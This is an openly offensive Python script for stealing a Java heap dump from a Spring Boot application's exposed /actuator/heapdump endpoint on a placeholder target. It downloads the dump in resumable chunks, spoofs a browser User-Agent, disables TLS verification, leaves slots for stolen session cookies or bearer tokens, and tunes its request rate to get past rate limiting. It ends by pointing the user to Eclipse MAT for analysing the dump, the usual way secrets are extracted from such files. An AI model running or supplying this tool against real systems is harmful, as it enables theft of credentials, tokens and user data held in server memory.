import requests
import os
import sys
import time

# --- CONFIGURATION ---
URL = "https://target.com/actuator/heapdump"
OUTPUT_FILE = "heapdump_fast.hprof"

# AGGRESSIVE MODE: 5MB Chunks
# If you get "413 Payload Too Large", lower this to 2 * 1024 * 1024 (2MB)
CHUNK_SIZE = 5 * 1024 * 1024  

# SPEED: 0.2s delay
# If you get "429 Too Many Requests", increase this to 1.0
DELAY = 0.2              

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    # "Cookie": "JSESSIONID=...", 
    # "Authorization": "Bearer ..."
}
# ---------------------

def main():
    # 1. Get Total Size from Server
    try:
        print(f"[*] Connecting to {URL}...")
        h = HEADERS.copy()
        # Request just the first byte to get the Content-Range header
        h["Range"] = "bytes=0-0" 
        r = requests.get(URL, headers=h, verify=False, timeout=15)
        
        if r.status_code not in [200, 206]:
            print(f"[!] Initialization Failed. Status Code: {r.status_code}")
            return

        if "Content-Range" in r.headers:
            total_size = int(r.headers["Content-Range"].split("/")[-1])
            print(f"[+] Total File Size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB)")
        else:
            # Fallback if server doesn't report range (unlikely)
            print("[!] Critical: Server didn't report size. Cannot proceed safely.")
            return
            
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    # 2. Check for existing progress (Resumable Logic)
    if os.path.exists(OUTPUT_FILE):
        current_byte = os.path.getsize(OUTPUT_FILE)
        if current_byte >= total_size:
            print("[+] File already fully downloaded.")
            return
        print(f"[*] Resuming from byte {current_byte:,}...")
    else:
        current_byte = 0
    
    # 3. Download Loop
    # Open in 'ab' (Append Binary) mode to add to the end of the file
    with open(OUTPUT_FILE, "ab") as f:
        while current_byte < total_size:
            # Calculate the end of the current chunk
            end_byte = min(current_byte + CHUNK_SIZE - 1, total_size - 1)
            range_header = f"bytes={current_byte}-{end_byte}"
            HEADERS["Range"] = range_header
            
            success = False
            
            # Retry loop for the current chunk
            while not success:
                try:
                    r = requests.get(URL, headers=HEADERS, verify=False, timeout=20)
                    
                    if r.status_code == 206:
                        f.write(r.content)
                        f.flush() # Save progress immediately
                        os.fsync(f.fileno()) # Force write to disk
                        
                        downloaded = len(r.content)
                        current_byte += downloaded
                        success = True
                        
                        # Progress Bar
                        percent = (current_byte / total_size) * 100
                        sys.stdout.write(f"\r[+] Progress: {percent:.2f}% | {current_byte}/{total_size} bytes")
                        sys.stdout.flush()
                        
                        time.sleep(DELAY)
                        
                    elif r.status_code == 413:
                        print(f"\n[!] 413 Payload Too Large. 5MB is too big.")
                        print(f"    -> Stop script. Change CHUNK_SIZE to 2 * 1024 * 1024.")
                        return

                    elif r.status_code == 429: # Too Many Requests
                        print(f"\n[!] Rate Limited (429). Sleeping 5s...")
                        time.sleep(5)
                        
                    else:
                        print(f"\n[!] Error {r.status_code}. Retrying in 2s...")
                        time.sleep(2)
                        
                except Exception as e:
                    print(f"\n[!] Network Error: {e}. Retrying...")
                    time.sleep(2)

    print(f"\n\n[SUCCESS] Download Complete. Verified size: {os.path.getsize(OUTPUT_FILE)}")
    print("[*] Now load 'heapdump_fast.hprof' into Eclipse MAT.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
